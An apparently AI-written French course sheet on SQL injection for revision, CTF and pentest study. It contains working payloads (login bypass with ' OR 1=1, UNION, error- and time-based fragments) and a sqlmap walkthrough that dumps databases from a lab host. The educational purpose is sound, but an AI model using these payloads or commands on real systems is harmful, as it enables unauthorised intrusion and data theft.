Parfait. Voici une **FICHE DE COURS COMPLÈTE, STRUCTURÉE, SCIENTIFIQUE et PUISSANTE** sur **SQL INJECTION**, au **niveau prépa / cybersécurité**, utilisable **pour révision, examen, CTF, pentest et défense**.

---

# 📘 FICHE DE COURS — SQL INJECTION (SQLi)

## 1. Définition fondamentale

**SQL Injection** est une vulnérabilité applicative qui permet à un attaquant :

* d’injecter du code SQL malveillant
* dans une requête SQL légitime
* afin de modifier son comportement logique

📌 **Cause racine** :

> Absence de validation, de filtrage ou de requêtes préparées sur les entrées utilisateur.

---

## 2. Rappels essentiels sur SQL

### 2.1 Structure d’une requête SQL

```sql
SELECT colonnes
FROM table
WHERE condition;
```

La clause **WHERE** est évaluée logiquement :

* TRUE → ligne retournée
* FALSE → ligne ignorée

---

### 2.2 Logique booléenne en SQL

| Opérateur | Signification                             |
| --------- | ----------------------------------------- |
| AND       | Toutes les conditions doivent être vraies |
| OR        | Une seule condition vraie suffit          |
| NOT       | Inverse la condition                      |

Exemple :

```sql
A AND B → vrai seulement si A et B sont vrais
A OR B → vrai si A ou B est vrai
```

---

## 3. Fonctionnement d’une application vulnérable

### 3.1 Schéma réel

```
Utilisateur
   ↓
Formulaire (input)
   ↓
Code applicatif (PHP, Python, Java…)
   ↓
Requête SQL construite dynamiquement
   ↓
Base de données (MySQL, PostgreSQL…)
```

💥 **Faille** si l’entrée utilisateur devient du SQL exécutable.

---

### 3.2 Exemple de code vulnérable

```php
$query = "SELECT * FROM users 
          WHERE username = '$user' 
          AND password = '$pass'";
```

---

## 4. Principe central de la SQL Injection

🎯 **Objectif de l’attaquant** :

* fermer une chaîne `'`
* injecter une condition logique
* forcer la requête à être vraie

---

## 5. Exemple canonique : bypass login

### 5.1 Requête normale

```sql
SELECT * FROM users 
WHERE username = 'John' 
AND password = 'secret';
```

---

### 5.2 Injection

Entrée :

```
' OR 1=1;-- -
```

Requête finale :

```sql
SELECT * FROM users 
WHERE username = 'John' 
AND password = '' OR 1=1;-- -';
```

🔎 Analyse logique :

```
(false AND false) OR true → true
```

➡️ Authentification contournée

---

## 6. Rôle du commentaire SQL

| DBMS       | Commentaire |
| ---------- | ----------- |
| MySQL      | `-- `       |
| PostgreSQL | `--`        |
| MSSQL      | `--`        |
| Oracle     | `--`        |

Exemple :

```sql
-- ignore le reste de la requête
```

---

## 7. Types de SQL Injection

### 7.1 SQL Injection classique (In-band)

#### a) UNION-based

```sql
UNION SELECT username, password FROM users;
```

Conditions :

* même nombre de colonnes
* types compatibles

✔️ Rapide
✔️ Très puissant

---

#### b) Error-based

Exemple MySQL :

```sql
EXTRACTVALUE(1, CONCAT(0x7e, database()));
```

➡️ Les erreurs révèlent les données

---

### 7.2 SQL Injection aveugle (Blind SQLi)

#### a) Boolean-based

```sql
AND 1=1 → réponse normale
AND 1=2 → réponse différente
```

Extraction **bit par bit**

---

#### b) Time-based

```sql
AND IF(condition, SLEEP(5), 0)
```

⏱️ Le temps devient un canal de communication

---

## 8. SQL Injection via GET et POST

### 8.1 GET

```text
http://site.com/page?id=1
```

Test :

```text
?id=1' OR 1=1--
```

---

### 8.2 POST

* Login
* Register
* Formulaires

➡️ Nécessite interception (Burp, ZAP)

---

## 9. SQLMap (outil automatisé)

### 9.1 Définition

**SQLMap** est un outil automatisé permettant :

* détection
* exploitation
* extraction complète des bases

---

### 9.2 Commandes essentielles

| Objectif           | Commande                |
| ------------------ | ----------------------- |
| Test vulnérabilité | `sqlmap -u URL`         |
| Mode assisté       | `sqlmap --wizard`       |
| Lister DB          | `--dbs`                 |
| Lister tables      | `-D db --tables`        |
| Dump table         | `-D db -T table --dump` |
| POST request       | `sqlmap -r request.txt` |

### Mise en pratique

1. Vérifier si la vulnérabilité est présente: 

```bash
sqlmap -u http://sqlmaptesting.thm/search/cat=1
```

2. Lister les bases de données:

```bash
sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs
```

3. Lister les tables:

```bash
sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D db --tables
```

4. Dump des données: (récupérer les données de la table)
http://site.com/page?id=1
```bash
sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D db -T table --dump
```

5. Pour allez vite(ctf):

```bash
sqlmap -u http://sqlmaptesting.thm/search/cat=1 --risk=3 --level=5 --batch
```

6. Si on connais déja le type de base de données:

```bash
sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbms=MySQL
```

7. Si on connais déja le type de base de données et le nom de la base:

```bash
sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbms=MySQL -D db
```

---

## 10. Ordre logique d’une attaque SQLi

1. Identifier un paramètre dynamique
2. Tester les injections
3. Identifier le SGBD
4. Extraire les bases
5. Extraire les tables
6. Dump des données
7. Post-exploitation (hashs, privilèges)

---

## 11. Impacts réels

* Vol de données
* Compromission comptes
* Escalade privilèges
* Violation RGPD
* Pertes financières

---

